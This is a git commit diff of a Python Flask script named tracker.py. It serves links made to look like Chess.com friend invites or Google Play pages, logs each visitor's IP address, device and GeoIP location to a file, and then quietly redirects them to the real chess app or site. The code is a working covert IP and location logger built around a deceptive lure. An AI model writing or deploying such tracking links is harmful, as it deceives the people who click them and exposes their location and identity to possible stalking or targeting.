e87f1f6211a29fa6e25815a7a4be2a62a0558010
Mr-Grinder <aaa3122556@gmail.com>
2025-08-05 22:56:25 +0300

    Update tracker.py

--- tracker.py
+++ tracker.py
@@ -8,30 +8,27 @@ import requests
 app = Flask(__name__)
 
 # Шлях до GeoLite2 бази
-BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 MMDB_URL = os.getenv("MMDB_URL")
 MMDB_PATH = "GeoLite2-City.mmdb"
+
 if not os.path.exists(MMDB_PATH):
     print("GeoLite2-City.mmdb not found, downloading...")
-    mmdb_url = os.getenv("MMDB_URL")
-    if not mmdb_url:
+    if not MMDB_URL:
         raise RuntimeError("MMDB_URL not set in environment variables")
-    r = requests.get(mmdb_url, timeout=120)
+    r = requests.get(MMDB_URL, timeout=120)
     r.raise_for_status()
     with open(MMDB_PATH, "wb") as f:
         f.write(r.content)
     print("Downloaded GeoLite2-City.mmdb, size:", os.path.getsize(MMDB_PATH))
-    # Перевіряємо початок
     with open(MMDB_PATH, "rb") as f:
         head = f.read(10)
         print("First bytes:", head)
     assert os.path.getsize(MMDB_PATH) > 10_000_000, "GeoLite2-City.mmdb файл занадто малий!"
 
-
 geoip_reader = geoip2.database.Reader(MMDB_PATH)
 
-@app.route("/store/apps/details")
-def track():
+@app.route("/friend/<ref>")
+def chess_friend(ref):
     ip = request.headers.get("X-Forwarded-For", request.remote_addr)
     ua_string = request.headers.get("User-Agent")
     ua = user_agents.parse(ua_string)
@@ -60,8 +57,14 @@ def track():
     with open("tracker_log.json", "a") as f:
         f.write(json.dumps(data, ensure_ascii=False) + "\n")
 
-    # Після логування одразу кидаємо в справжній Play Market
-    return redirect("https://link.chess.com/friend/YSm8za", code=302)
+    if "Android" in ua.os.family:
+        return redirect("https://play.google.com/store/apps/details?id=com.chess", code=302)
+
+    elif "iOS" in ua.os.family or "iPhone" in ua.device.family or "iPad" in ua.device.family:
+        return redirect("https://apps.apple.com/us/app/chess-play-learn/id329218549", code=302)
+
+    else:
+        return redirect(f"https://link.chess.com/friend/{ref}", code=302)
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8080)
